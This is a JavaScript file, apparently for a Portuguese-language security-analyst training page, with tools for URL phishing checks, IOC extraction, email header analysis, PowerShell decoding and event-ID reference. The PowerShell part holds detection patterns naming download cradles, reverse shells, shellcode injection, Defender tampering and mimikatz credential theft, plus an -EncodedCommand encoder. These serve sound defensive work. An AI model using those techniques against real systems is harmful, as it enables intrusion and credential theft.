/* ===================== Abas + Ferramentas ===================== */
(function(){
"use strict";
const $ = s => document.querySelector(s);
const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));


/* ---------- utilidades ---------- */
function copyText(txt, btn){
  const done = () => { const o = btn.textContent; btn.textContent = "Copiado"; setTimeout(() => btn.textContent = o, 1300); };
  const fallback = () => {
    const ta = document.createElement("textarea"); ta.value = txt; ta.style.cssText = "position:fixed;opacity:0;left:0;top:0";
    document.body.appendChild(ta); ta.select(); let ok = false; try { ok = document.execCommand("copy"); } catch(e) {}
    ta.remove(); if (ok) done(); else { const o = btn.textContent; btn.textContent = "Selecione e copie"; setTimeout(() => btn.textContent = o, 1800); }
  };
  try { navigator.clipboard.writeText(txt).then(done, fallback); } catch(e) { fallback(); }
}
function refang(s){
  return String(s).replace(/\bhxxp/gi, "http").replace(/\bfxp/gi, "ftp")
    .replace(/\[\.\]|\(\.\)|\{\.\}|\[dot\]|\(dot\)/gi, ".")
    .replace(/\[@\]|\[at\]|\(at\)/gi, "@").replace(/\[:\]/g, ":").replace(/\[\/\/\]/g, "//");
}
const RX_TOKEN = /\b(?:https?|ftp):\/\/[^\s<>"'`]+|[\w.+-]+@[a-z0-9-]+(?:\.[a-z0-9-]+)+|\b(?:\d{1,3}\.){3}\d{1,3}\b|\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/gi;
function defangOne(m){
  if (/^(?:https?|ftp):/i.test(m)) return m.replace(/^http/i, "hxxp").replace(/^ftp/i, "fxp").replace(/\./g, "[.]");
  if (m.includes("@")) return m.replace("@", "[@]").replace(/\./g, "[.]");
  return m.replace(/\./g, "[.]");
}
const defang = s => refang(s).replace(RX_TOKEN, defangOne);
const isIp = h => /^(?:\d{1,3}\.){3}\d{1,3}$/.test(h) && h.split(".").every(n => +n <= 255);
function privIp(ip){ const [a,b] = ip.split(".").map(Number);
  return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168) || (a === 169 && b === 254) || a === 0; }
const flagList = arr => arr.length ? `<ul class="flags">${arr.map(([lv,t]) => `<li><span class="lv ${lv}">${{alto:"alto",medio:"médio",baixo:"info",ok:"ok"}[lv]}</span><span>${t}</span></li>`).join("")}</ul>` : "";

const emptyMsg = `<p class="warnmsg">O campo está vazio. Cole algo ou clique em <b>Exemplo prático</b>, logo acima.</p>`;
/* ---------- 1. URL ---------- */
const SLD2 = new Set(["com.br","gov.br","org.br","net.br","edu.br","jus.br","mil.br","leg.br","art.br","blog.br","app.br","co.uk","org.uk","gov.uk","ac.uk","com.au","co.jp","com.ar","com.mx","co.za","com.pt"]);
const HOSTING = ["run.app","web.app","firebaseapp.com","appspot.com","cloudfunctions.net","azurewebsites.net","herokuapp.com","vercel.app","netlify.app","pages.dev","workers.dev","github.io","glitch.me","repl.co","ngrok.io","ngrok-free.app","blogspot.com","wixsite.com","weebly.com","000webhostapp.com","r2.dev","s3.amazonaws.com","web.core.windows.net","trycloudflare.com","onrender.com","fly.dev"];
const SHORT = ["bit.ly","tinyurl.com","t.co","cutt.ly","is.gd","ow.ly","rebrand.ly","shorturl.at","encurtador.com.br","rb.gy","tiny.cc","t.ly"];
const BRANDS = ["gov.br","detran","office","microsoft","outlook","gmail","google","apple","icloud","paypal","itau","bradesco","santander","nubank","caixa","correios","receita","serasa","mercadolivre","netflix","whatsapp","instagram","facebook","amazon","banco","login","conta","senha"];
const CHEAP_TLD = ["top","xyz","icu","click","link","zip","mov","buzz","rest","monster","cyou","sbs","cfd","online","site","live","support","quest","lat","shop","info"];
const RISKY_EXT = /\.(exe|scr|zip|rar|7z|js|jse|vbs|hta|iso|img|lnk|apk|msi|docm|xlsm|bat|cmd|ps1)(?:$|[?#])/i;
function regDomain(h){ if (isIp(h)) return h; const p = h.split("."); if (p.length <= 2) return h; const l2 = p.slice(-2).join("."); return SLD2.has(l2) ? p.slice(-3).join(".") : l2; }
function analyzeUrl(raw){
  let s = refang(raw.trim()); if (!s) return "";
  let assumed = false;
  if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(s)){ s = "http://" + s; assumed = true; }
  const m = s.match(/^([a-z][a-z0-9+.-]*):\/\/([^\/?#]*)([^?#]*)(\?[^#]*)?(#.*)?$/i);
  if (!m) return `<p>Não consegui ler essa URL.</p>`;
  const scheme = m[1].toLowerCase(), auth = m[2], path = m[3] || "", query = m[4] || "", frag = m[5] || "";
  const at = auth.lastIndexOf("@");
  const userinfo = at >= 0 ? auth.slice(0, at) : "", hostport = at >= 0 ? auth.slice(at + 1) : auth;
  const pm = hostport.match(/^(\[[^\]]+\]|[^:]*)(?::(\d*))?$/) || [hostport, hostport, ""];
  const hostRaw = pm[1].toLowerCase().replace(/\.$/, ""), port = pm[2] || "";
  let host = hostRaw; try { host = new URL(scheme + "://" + hostRaw).hostname || hostRaw; } catch(e) {}
  const reg = regDomain(host), F = [];
  if (userinfo) F.push(["alto", `Tem <code>@</code> na autoridade: <code>${esc(userinfo.slice(0,60))}</code> é <b>userinfo</b> e é ignorado. O destino é <code>${esc(host)}</code>.`]);
  if (isIp(host)) F.push([privIp(host) ? "medio" : "alto", `O host é um IP${privIp(host) ? " privado" : ""}, sem domínio. Sites legítimos quase nunca mandam o usuário para um IP.`]);
  if (/(^|\.)xn--/.test(host)) F.push(["medio", "Domínio em punycode (<code>xn--</code>): pode imitar letras de outra marca (homógrafo)."]);
  const hostingHit = HOSTING.find(h => host === h || host.endsWith("." + h));
  if (hostingHit) F.push(["medio", `Hospedado em plataforma pública (<code>${hostingHit}</code>). Qualquer pessoa cria um subdomínio lá; a boa reputação do domínio não diz quem é o dono.`]);
  if (SHORT.includes(host)) F.push(["medio", "Encurtador de link: o destino real fica escondido. Expanda num serviço de análise antes de abrir."]);
  const hay = (userinfo + " " + host.slice(0, Math.max(0, host.length - reg.length)) + " " + path).toLowerCase();
  const brand = BRANDS.find(b => hay.includes(b) && !reg.includes(b.replace(".br","")));
  if (brand) F.push(["alto", `A palavra <code>${esc(brand)}</code> aparece na URL, mas o domínio registrado é <code>${esc(reg)}</code>. Marca fora do domínio é isca.`]);
  if (/gov\.br/.test(hay) && !/\.gov\.br$/.test(host)) F.push(["alto", "Diz ser gov.br, mas o host não termina em <code>.gov.br</code>."]);
  const tld = host.split(".").pop();
  if (!isIp(host) && CHEAP_TLD.includes(tld)) F.push(["baixo", `TLD <code>.${tld}</code> é barato e comum em campanhas. Sozinho não prova nada.`]);
  if (!isIp(host) && host.split(".").length > 4) F.push(["medio", `Muitos subdomínios (${host.split(".").length} níveis): truque para empurrar o domínio real para fora da tela.`]);
  if (port && !["80","443"].includes(port)) F.push(["medio", `Porta incomum: <code>${esc(port)}</code>.`]);
  if (scheme === "http" && !assumed) F.push(["baixo", "Sem HTTPS. Lembre: com HTTPS também não quer dizer que é seguro."]);
  if (RISKY_EXT.test(path)) F.push(["alto", "O caminho termina num tipo de arquivo executável ou compactado."]);
  if (/[?&][a-z_]*(url|redirect|next|goto|dest|continue)=/i.test(query)) F.push(["medio", "Parâmetro de redirecionamento na query: pode ser open redirect para outro site."]);
  if (/%25[0-9a-f]{2}/i.test(s)) F.push(["medio", "Codificação dupla (<code>%25</code>): forma comum de esconder caracteres de filtros."]);
  if (s.length > 140) F.push(["baixo", `URL longa (${s.length} caracteres).`]);
  const hi = F.filter(f => f[0] === "alto").length, md = F.filter(f => f[0] === "medio").length;
  const verdict = hi ? ["alto","Suspeita alta"] : md ? ["medio","Merece análise"] : ["ok","Nenhum sinal óbvio (não é garantia)"];
  const part = (cls, txt, tag) => txt ? `<span class="p-${cls}">${esc(txt)}<small>${tag}</small></span>` : "";
  return `<div class="urlparts">${part("scheme", scheme + "://", "esquema")}${part("userinfo", userinfo, "ignorado")}${userinfo ? part("at", "@", "separador") : ""}${part("host", hostRaw, "destino real")}${port ? part("port", ":" + port, "porta") : ""}${part("path", path, "caminho")}${part("q", query, "query")}${part("q", frag, "fragmento")}</div>
    <dl class="kv"><dt>Host real</dt><dd>${esc(host)}</dd><dt>Domínio registrado</dt><dd>${esc(reg)}</dd><dt>Para o ticket</dt><dd>${esc(defang(s))}</dd>
    <dt>Leitura</dt><dd><span class="lv ${verdict[0]}">${verdict[1]}</span></dd></dl>${flagList(F)}
    ${assumed ? `<p class="sub2">Sem esquema na entrada: considerei <code>http://</code>.</p>` : ""}`;
}
$("#urlGo").onclick = () => { const v = $("#urlIn").value.trim(); $("#urlOut").innerHTML = v ? analyzeUrl(v) : emptyMsg; };
$("#urlIn").onkeydown = e => { if (e.key === "Enter") $("#urlGo").click(); };

/* ---------- 2. defang ---------- */
function dfRun(fn){ const v = $("#dfIn").value, o = $("#dfOut"); if (!v.trim()){ o.hidden = true; $("#dfMsg").innerHTML = emptyMsg; return; } $("#dfMsg").innerHTML = ""; o.textContent = fn(v); o.hidden = false; }
$("#dfGo").onclick = () => dfRun(defang);
$("#rfGo").onclick = () => dfRun(refang);
$("#dfCopy").onclick = e => { const t = $("#dfOut").textContent; if (t) copyText(t, e.currentTarget); };

/* ---------- 3. IOCs ---------- */
const NOT_DOMAIN = /\.(eml|py|ps1|exe|dll|txt|json|log|xml|conf|html?|js|css|png|jpe?g|pdf|docx?|xlsx?|zip|evtx|sys|bat|cmd|lnk|msi|ova|iso|md)$/i;
let lastIoc = "";
function extractIocs(raw){
  const t = refang(raw);
  const uniq = a => [...new Set(a)];
  const urls = uniq((t.match(/\b(?:https?|ftp):\/\/[^\s<>"'`)\]]+/gi) || []).map(u => u.replace(/[.,;:]+$/, "")));
  const emails = uniq((t.match(/[\w.+-]+@[a-z0-9-]+(?:\.[a-z0-9-]+)+/gi) || []).map(x => x.toLowerCase()));
  const ips = uniq((t.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []).filter(isIp));
  const inUrl = new Set(), inMail = new Set(emails.map(e => e.split("@")[1]));
  urls.forEach(u => { const m = u.match(/^[a-z]+:\/\/(?:[^\/?#@]*@)?([^\/?#:]+)/i); if (m) inUrl.add(m[1].toLowerCase()); });
  const domains = uniq((t.match(/\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/gi) || []).map(d => d.toLowerCase()))
    .filter(d => !isIp(d) && !NOT_DOMAIN.test(d) && !inMail.has(d) && !/^(smtp|header|policy)\.[a-z]+$/.test(d));
  const sha256 = uniq(t.match(/\b[a-f0-9]{64}\b/gi) || []), sha1 = uniq((t.match(/\b[a-f0-9]{40}\b/gi) || [])), md5 = uniq((t.match(/\b[a-f0-9]{32}\b/gi) || []));
  const cves = uniq((t.match(/\bCVE-\d{4}-\d{4,7}\b/gi) || []).map(x => x.toUpperCase()));
  const mitre = uniq(t.match(/\bT1\d{3}(?:\.\d{3})?\b/g) || []);
  return { "URLs":urls, "Domínios":domains, "IPv4":ips, "E-mails":emails, "SHA-256":sha256, "SHA-1":sha1, "MD5":md5, "CVEs":cves, "MITRE ATT&CK":mitre };
}
$("#iocGo").onclick = () => {
  if (!$("#iocIn").value.trim()){ lastIoc = ""; $("#iocOut").innerHTML = emptyMsg; return; }
  const R = extractIocs($("#iocIn").value), df = $("#iocDf").checked; const lines = []; let html = "", total = 0;
  Object.entries(R).forEach(([k, arr]) => {
    if (!arr.length) return; total += arr.length;
    const shown = arr.map(v => (df && !/^(SHA|MD5|CVE|MITRE)/.test(k)) ? defang(v) : v);
    lines.push(`# ${k}`, ...shown, "");
    html += `<div class="iocg"><h4>${esc(k)} · ${arr.length}</h4><pre class="mono">${shown.map(v => {
      if (k === "IPv4") return esc(v) + (privIp(arr[shown.indexOf(v)]) ? "   (privado/interno)" : "");
      return esc(v); }).join("\n")}</pre></div>`;
  });
  lastIoc = lines.join("\n").trim();
  $("#iocOut").innerHTML = total ? `<p class="sub2">${total} indicador(es) únicos.</p>` + html : `<p class="sub2">Nenhum indicador encontrado.</p>`;
};
$("#iocCopy").onclick = e => { if (!lastIoc) $("#iocGo").click(); if (lastIoc) copyText(lastIoc, e.currentTarget); };

/* ---------- 4. cabeçalhos ---------- */
function decodeWords(s){
  return String(s).replace(/=\?([^?]+)\?([BbQq])\?([^?]*)\?=\s*/g, (m, cs, enc, txt) => {
    try {
      let bytes;
      if (enc.toUpperCase() === "B"){ const b = atob(txt); bytes = Uint8Array.from(b, c => c.charCodeAt(0)); }
      else { const q = txt.replace(/_/g, " "); const out = []; for (let i = 0; i < q.length; i++){ if (q[i] === "=" && /^[0-9a-f]{2}$/i.test(q.substr(i+1, 2))){ out.push(parseInt(q.substr(i+1, 2), 16)); i += 2; } else out.push(q.charCodeAt(i)); } bytes = new Uint8Array(out); }
      let dec; try { dec = new TextDecoder(cs.toLowerCase()); } catch(e) { dec = new TextDecoder("utf-8"); }
      return dec.decode(bytes);
    } catch(e) { return m; }
  });
}
const addr = v => { const m = String(v || "").match(/<([^>]+)>/); return (m ? m[1] : String(v || "").trim().split(/\s+/).pop() || "").toLowerCase(); };
const domOf = a => (a.split("@")[1] || "").replace(/[>\s]/g, "");
function analyzeHeaders(raw){
  const text = raw.replace(/\r\n/g, "\n"); if (!text.trim()) return "";
  const head = text.split(/\n[ \t]*\n/)[0], H = [];
  head.split("\n").forEach(l => { if (/^[ \t]/.test(l) && H.length) H[H.length-1].v += " " + l.trim(); else { const i = l.indexOf(":"); if (i > 0) H.push({ k:l.slice(0,i).trim().toLowerCase(), v:l.slice(i+1).trim() }); } });
  if (!H.length) return `<p>Não encontrei cabeçalhos no formato <code>Nome: valor</code>.</p>`;
  const get = k => (H.find(h => h.k === k) || {}).v || "";
  const rec = H.filter(h => h.k === "received").map(h => h.v).reverse();
  const hops = rec.map(v => {
    const fromSeg = (v.split(/\sby\s/i)[0] || "");
    const from = (fromSeg.match(/from\s+(\S+)/i) || [])[1] || "—";
    const ip = (fromSeg.match(/\b((?:\d{1,3}\.){3}\d{1,3})\b/g) || []).filter(isIp).find(x => x !== "127.0.0.1" && x !== "127.0.1.1") || "";
    const by = (v.match(/\bby\s+(\S+)/i) || [])[1] || "—";
    const date = v.includes(";") ? v.slice(v.lastIndexOf(";") + 1).trim() : "";
    return { from, ip, by, date };
  });
  const authAll = H.filter(h => h.k === "authentication-results" || h.k === "arc-authentication-results").map(h => h.v).join(" ; ");
  const res = k => ((authAll.match(new RegExp("\\b" + k + "=(\\w+)", "i")) || [])[1] || "").toLowerCase();
  const spf = res("spf") || (get("received-spf").split(/\s/)[0] || "").toLowerCase(), dkim = res("dkim"), dmarc = res("dmarc");
  let scl = get("x-ms-exchange-organization-scl"); if (!scl){ const m = get("x-forefront-antispam-report").match(/SCL:(-?\d)/); if (m) scl = m[1]; }
  const from = addr(get("from")), rp = addr(get("return-path")), rt = addr(get("reply-to"));
  const fd = domOf(from), F = [];
  if (hops.length){ const h0 = hops[0];
    if (/127\.|localhost|\[127/i.test(h0.from)) F.push(["alto", `O 1º salto se apresentou como <code>${esc(h0.from)}</code> (loopback): servidor mal configurado, típico de script de disparo.`]);
    if (h0.ip) F.push([privIp(h0.ip) ? "baixo" : "medio", `IP de origem: <code>${esc(defang(h0.ip))}</code>. Consulte RDAP/WHOIS e AbuseIPDB.`]); }
  if (fd && !/\.[a-z]{2,}$/i.test(fd)) F.push(["alto", `O domínio do From (<code>${esc(fd)}</code>) não tem TLD: não é um endereço de internet válido.`]);
  if (rp && fd && domOf(rp) && domOf(rp) !== fd) F.push(["medio", `Return-Path (<code>${esc(domOf(rp))}</code>) é diferente do From (<code>${esc(fd)}</code>).`]);
  if (rt && fd && domOf(rt) !== fd) F.push(["alto", `Reply-To aponta para outro domínio (<code>${esc(domOf(rt))}</code>): a resposta vai para o golpista.`]);
  [["SPF",spf],["DKIM",dkim],["DMARC",dmarc]].forEach(([n,v]) => { if (v && v !== "pass") F.push([v === "fail" || v === "softfail" ? "alto" : "medio", `${n}=${esc(v)}${v === "none" ? ": não havia o que verificar" : ""}.`]); });
  if (spf === "pass" && dkim === "pass" && dmarc === "pass") F.push(["baixo", "Autenticação passou: prova só que aquele domínio enviou. Confira se o domínio é mesmo o oficial."]);
  if (scl !== "" && +scl >= 5) F.push(["alto", `SCL ${esc(scl)}: a Microsoft classificou como spam${+scl >= 9 ? " de alta confiança" : ""}.`]);
  const mid = get("message-id"); if (/127\.0\.|localhost/i.test(mid)) F.push(["medio", "Message-ID gerado em localhost."]);
  const cls = v => v === "pass" ? "pass" : v === "fail" || v === "softfail" ? "fail" : "other";
  return `<dl class="kv"><dt>From</dt><dd>${esc(decodeWords(get("from")) || "—")}</dd>${rp ? `<dt>Return-Path</dt><dd>${esc(rp)}</dd>` : ""}${rt ? `<dt>Reply-To</dt><dd>${esc(rt)}</dd>` : ""}
    <dt>Assunto</dt><dd>${esc(decodeWords(get("subject")) || "—")}</dd>${get("date") ? `<dt>Date</dt><dd>${esc(get("date"))}</dd>` : ""}${scl !== "" ? `<dt>SCL</dt><dd>${esc(scl)}</dd>` : ""}</dl>
    <div class="auth">${[["SPF",spf],["DKIM",dkim],["DMARC",dmarc]].map(([n,v]) => `<span class="${cls(v)}">${n}: ${esc(v || "ausente")}</span>`).join("")}</div>
    ${hops.length ? `<p class="sub2" style="margin:8px 0 0">Caminho, do envio até a caixa (Received lidos de baixo para cima):</p><ol class="hops">${hops.map((h,i) => `<li><b>${i+1}</b><span><code>${esc(h.from)}</code>${h.ip ? ` · <code>${esc(defang(h.ip))}</code>` : ""} → <code>${esc(h.by)}</code>${h.date ? `<br><span class="sub2">${esc(h.date)}</span>` : ""}</span></li>`).join("")}</ol>` : `<p class="sub2">Nenhum cabeçalho Received.</p>`}
    ${flagList(F)}`;
}
$("#hdrGo").onclick = () => { $("#hdrOut").innerHTML = $("#hdrIn").value.trim() ? analyzeHeaders($("#hdrIn").value) : emptyMsg; };

/* ---------- 5. PowerShell ---------- */
const PS_FLAGS = [
  [/\b(IEX|Invoke-Expression)\b/i, "alto", "IEX / Invoke-Expression: executa texto como código"],
  [/DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|\biwr\b|Net\.WebClient|Start-BitsTransfer|Invoke-RestMethod|\birm\b/i, "alto", "baixa conteúdo da internet (T1105)"],
  [/FromBase64String/i, "medio", "mais uma camada de Base64 dentro do script"],
  [/VirtualAlloc|WriteProcessMemory|CreateRemoteThread|CreateThread|Marshal\]::Copy/i, "alto", "API de memória: possível injeção de shellcode"],
  [/Net\.Sockets\.TCPClient|GetStream\(\)|:4444\b|,\s*4444\b/i, "alto", "conexão de rede crua, padrão de reverse shell"],
  [/Add-MpPreference|Set-MpPreference|DisableRealtimeMonitoring|ExclusionPath/i, "alto", "mexe no Microsoft Defender"],
  [/New-Service|\bsc(\.exe)?\s+create|schtasks|Register-ScheduledTask|CurrentVersion\\Run/i, "alto", "cria persistência (serviço, tarefa ou chave Run)"],
  [/mimikatz|sekurlsa|lsass|Out-Minidump/i, "alto", "roubo de credenciais"],
  [/-bxor|\[char\]\s*\d|-join\s*\(|\.replace\(/i, "medio", "monta strings em tempo de execução (ofuscação)"],
  [/Write-Host|Get-Date|whoami/i, "baixo", "comando inofensivo por si só"]
];
const OUTER = [
  [/\s-(?:w|wi|win|windowstyle)\s+h(?:idden)?\b/i, "medio", "-WindowStyle Hidden: janela escondida"],
  [/\s-(?:nop|noprofile)\b/i, "baixo", "-NoProfile"],
  [/\s-(?:noni|noninteractive)\b/i, "baixo", "-NonInteractive"],
  [/\s-(?:ep|exec|executionpolicy)\s+bypass\b/i, "medio", "-ExecutionPolicy Bypass"]
];
function b64bytes(b){ b = b.replace(/[^A-Za-z0-9+\/=_-]/g, "").replace(/-/g, "+").replace(/_/g, "/"); while (b.length % 4) b += "="; const s = atob(b); return Uint8Array.from(s, c => c.charCodeAt(0)); }
function findEnc(cmd){
  const re = /(?:^|\s)[-\/]([a-z]+)\s+["']?([A-Za-z0-9+\/=]{8,})["']?/gi; let m;
  while ((m = re.exec(cmd))){ const f = m[1].toLowerCase(); if (f === "ec" || (f[0] === "e" && "encodedcommand".startsWith(f))) return m[2]; }
  const t = cmd.trim(); if (/^[A-Za-z0-9+\/=\s]{8,}$/.test(t)) return t.replace(/\s/g, "");
  return null;
}
function decodePs(raw){
  const b = findEnc(raw);
  if (!b) return `<p>Não achei um Base64 depois de <code>-enc</code>/<code>-EncodedCommand</code>, nem um Base64 puro.</p>`;
  let bytes; try { bytes = b64bytes(b); } catch(e) { return `<p>Esse texto não é Base64 válido.</p>`; }
  let zeros = 0; for (let i = 1; i < bytes.length; i += 2) if (bytes[i] === 0) zeros++;
  const utf16 = bytes.length > 1 && zeros / Math.floor(bytes.length / 2) > .4;
  const txt = new TextDecoder(utf16 ? "utf-16le" : "utf-8").decode(bytes);
  const F = [];
  OUTER.forEach(([re, lv, t]) => { if (re.test(" " + raw)) F.push([lv, t]); });
  PS_FLAGS.forEach(([re, lv, t]) => { if (re.test(txt)) F.push([lv, t]); });
  return `<dl class="kv"><dt>Codificação</dt><dd>${utf16 ? "UTF-16LE (padrão do -EncodedCommand)" : "UTF-8"}</dd><dt>Tamanho</dt><dd>${bytes.length} bytes</dd></dl>
    <pre class="mono">${esc(txt.replace(/(?:https?|ftp):\/\/[^\s<>"'`)]+|(?:\d{1,3}\.){3}\d{1,3}/gi, defangOne))}</pre>${flagList(F)}<p class="sub2">URLs e IPs saem com defang. Esse é o mesmo texto que o evento 4104 registraria.</p>`;
}
$("#psGo").onclick = () => { $("#psOut").innerHTML = $("#psIn").value.trim() ? decodePs($("#psIn").value) : emptyMsg; };
$("#psEnc").onclick = () => {
  const t = $("#psIn").value; if (!t.trim()){ $("#psOut").innerHTML = emptyMsg; return; }
  const u = new Uint8Array(t.length * 2); for (let i = 0; i < t.length; i++){ const c = t.charCodeAt(i); u[i*2] = c & 255; u[i*2+1] = c >> 8; }
  let s = ""; u.forEach(x => s += String.fromCharCode(x)); const b = btoa(s);
  $("#psOut").innerHTML = `<p class="sub2">Assim o comando vira -EncodedCommand (útil para testes no lab):</p><pre class="mono">powershell.exe -EncodedCommand ${esc(b)}</pre>`;
};

/* ---------- 6. hash ---------- */
const hex = buf => [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, "0")).join("");
async function hashes(buf, label){
  const out = $("#hashOut");
  if (!(window.crypto && crypto.subtle)){ out.innerHTML = `<p>Este navegador não liberou a API de criptografia aqui.</p>`; return; }
  out.innerHTML = `<p class="sub2">Calculando…</p>`;
  try {
    const [a, b] = await Promise.all([crypto.subtle.digest("SHA-256", buf), crypto.subtle.digest("SHA-1", buf)]);
    const cmp = $("#hashCmp").value.trim().toLowerCase(), ha = hex(a), hb = hex(b);
    const verdict = cmp ? (cmp === ha || cmp === hb ? `<p><span class="lv ok">confere</span> O hash esperado é igual ao calculado: é o mesmo conteúdo.</p>` : `<p><span class="lv alto">não confere</span> O conteúdo é diferente do esperado (foi alterado ou é outro arquivo).</p>`) : "";
    out.innerHTML = verdict + `<dl class="kv"><dt>Entrada</dt><dd>${esc(label)}</dd><dt>SHA-256</dt><dd>${ha}</dd><dt>SHA-1</dt><dd>${hb}</dd></dl>
      <div class="row" style="margin-top:8px"><button class="btn ghost" type="button" id="hashCopy">Copiar SHA-256</button></div>`;
    $("#hashCopy").onclick = e => copyText(hex(a), e.currentTarget);
  } catch(e) { out.innerHTML = `<p>Não foi possível calcular: ${esc(e.message || e)}</p>`; }
}
$("#hashGo").onclick = () => { const t = $("#hashIn").value; if (!t){ $("#hashOut").innerHTML = emptyMsg; return; } hashes(new TextEncoder().encode(t), `texto, ${new TextEncoder().encode(t).length} bytes UTF-8`); };
$("#hashFile").onchange = e => { const f = e.target.files[0]; if (!f) return; const r = new FileReader();
  r.onload = () => hashes(r.result, `${f.name} (${f.size.toLocaleString("pt-BR")} bytes)`); r.readAsArrayBuffer(f); e.target.value = ""; };

/* ---------- 7. horário ---------- */
const MON = {jan:0,feb:1,fev:1,mar:2,apr:3,abr:3,may:4,mai:4,jun:5,jul:6,aug:7,ago:7,sep:8,set:8,oct:9,out:9,nov:10,dec:11,dez:11};
function parseTime(s, zone){
  s = s.trim(); if (!s) return null;
  if (/^\d{10}(\.\d+)?$/.test(s)) return new Date(parseFloat(s) * 1000);
  if (/^\d{13}$/.test(s)) return new Date(+s);
  if (/(?:Z|[+-]\d{2}:?\d{2})$/.test(s) && /^\d{4}-/.test(s)){ const d = new Date(s); if (!isNaN(d)) return d; }
  let Y, Mo, D, h = 0, mi = 0, se = 0, ms = 0, m;
  if ((m = s.match(/^(\d{4})-(\d{2})-(\d{2})(?:[ T](\d{1,2}):(\d{2})(?::(\d{2})(?:[.,](\d{1,3}))?)?)?/))) { [, Y, Mo, D, h = 0, mi = 0, se = 0, ms = 0] = m; Mo = +Mo - 1; }
  else if ((m = s.match(/^(\d{1,2})\/(\d{1,2})\/(\d{4})(?:[ ,]+(\d{1,2}):(\d{2})(?::(\d{2})(?:[.,](\d{1,3}))?)?)?/))) { [, D, Mo, Y, h = 0, mi = 0, se = 0, ms = 0] = m; Mo = +Mo - 1; }
  else if ((m = s.match(/^([a-zç]{3})[a-zç]*\.?\s+(\d{1,2}),?\s+(\d{4})(?:\s*@?\s*(\d{1,2}):(\d{2})(?::(\d{2})(?:[.,](\d{1,3}))?)?)?/i))) { let mn; [, mn, D, Y, h = 0, mi = 0, se = 0, ms = 0] = m; Mo = MON[mn.toLowerCase()]; if (Mo == null) return null; }
  else return null;
  ms = +String(ms).padEnd(3, "0");
  if (zone === "local") return new Date(+Y, Mo, +D, +h, +mi, +se, ms);
  return new Date(Date.UTC(+Y, Mo, +D, +h, +mi, +se, ms) - (+zone) * 3600000);
}
function fmtOff(d, off){ const x = new Date(d.getTime() + off * 3600000); const p = n => String(n).padStart(2, "0");
  return `${x.getUTCFullYear()}-${p(x.getUTCMonth()+1)}-${p(x.getUTCDate())} ${p(x.getUTCHours())}:${p(x.getUTCMinutes())}:${p(x.getUTCSeconds())}.${String(x.getUTCMilliseconds()).padStart(3,"0")}`; }
$("#tmGo").onclick = () => {
  if (!$("#tmIn").value.trim()){ $("#tmOut").innerHTML = emptyMsg; return; }
  const d = parseTime($("#tmIn").value, $("#tmZone").value);
  if (!d || isNaN(d)){ $("#tmOut").innerHTML = `<p>Não entendi o formato. Exemplos: <code>2026-11-14 05:57:04</code>, <code>14/11/2026 05:57</code>, <code>Nov 14, 2026 @ 01:57:04.000</code> ou epoch.</p>`; return; }
  const lo = -d.getTimezoneOffset() / 60;
  $("#tmOut").innerHTML = `<dl class="kv"><dt>UTC (eventos do Windows)</dt><dd>${fmtOff(d,0)}</dd><dt>UTC−4 (dashboard do lab)</dt><dd>${fmtOff(d,-4)}</dd>
    <dt>UTC−3 (Brasília)</dt><dd>${fmtOff(d,-3)}</dd><dt>Este computador (UTC${lo >= 0 ? "+" : "−"}${Math.abs(lo)})</dt><dd>${fmtOff(d,lo)}</dd>
    <dt>Epoch (s)</dt><dd>${Math.floor(d.getTime()/1000)}</dd><dt>ISO 8601</dt><dd>${d.toISOString()}</dd></dl>`;
};
$("#tmIn").onkeydown = e => { if (e.key === "Enter") $("#tmGo").click(); };
$("#tmNow").onclick = () => { $("#tmIn").value = new Date().toISOString(); $("#tmGo").click(); };

/* ---------- 8. correlação ---------- */
function calc(){
  const n = Math.max(0, Math.floor(+$("#cFails").value || 0)), gap = Math.max(0, +String($("#cGap").value).replace(",", ".") || 0),
        f = Math.max(1, Math.floor(+$("#cFreq").value || 1)), tf = Math.max(0, +$("#cTf").value || 0);
  let html;
  if (n < f) html = `<p><span class="lv medio">não dispara</span> ${n} falha(s) é menos que o frequency ${f}. Cada uma vira só o alerta simples (como a 60122).</p>`;
  else if ((f - 1) * gap > tf) html = `<p><span class="lv medio">não dispara</span> As ${f} falhas levam ${((f-1)*gap).toFixed(1)} s, mais que o timeframe de ${tf} s. Um ataque lento passa por baixo da regra.</p>`;
  else { const t = (f - 1) * gap;
    html = `<p><span class="lv alto">dispara</span> na <b>${f}ª falha</b>, ${t.toFixed(1)} s depois da primeira. Essa falha vira o alerta correlacionado; ${f-1} ficam como alertas simples${n > f ? ` e as ${n-f} seguintes voltam a ser simples` : ""}.</p>
      <p class="sub2">Com ${n} falhas: ${n-1} alertas simples + 1 correlacionado. No Cenário 1 foram 9 falhas: 8 da 60122 e 1 da 60204.</p>`; }
  $("#calcOut").innerHTML = html + `<p class="sub2">O timeframe muda de regra para regra; confira o XML da regra no Wazuh.</p>`;
}
["#cFails","#cGap","#cFreq","#cTf"].forEach(s => $(s).addEventListener("input", calc)); calc();

/* ---------- 9. referência ---------- */
const REF = [
 ["Security","4624","Logon bem-sucedido. Olhe logonType, ipAddress e o pacote de autenticação."],
 ["Security","4625","Falha de logon. O subStatus diz o motivo."],
 ["Security","4634","Logoff."],
 ["Security","4648","Logon com credenciais explícitas (runas, ou movimento lateral)."],
 ["Security","4672","Privilégios especiais atribuídos ao logon (conta administrativa)."],
 ["Security","4688","Processo criado (precisa da auditoria de criação de processos ligada)."],
 ["Security","4697","Serviço instalado (visto pelo log Security)."],
 ["Security","4698","Tarefa agendada criada."],
 ["Security","4720","Conta de usuário criada."],
 ["Security","4722","Conta de usuário habilitada."],
 ["Security","4724","Tentativa de redefinir a senha de uma conta."],
 ["Security","4728","Membro adicionado a grupo global de segurança."],
 ["Security","4732","Membro adicionado a grupo local (ex.: Administradores)."],
 ["Security","4740","Conta bloqueada por excesso de falhas."],
 ["Security","4768","Ticket Kerberos TGT solicitado."],
 ["Security","4769","Ticket de serviço Kerberos solicitado."],
 ["Security","4771","Pré-autenticação Kerberos falhou."],
 ["Security","4776","Validação de credencial NTLM."],
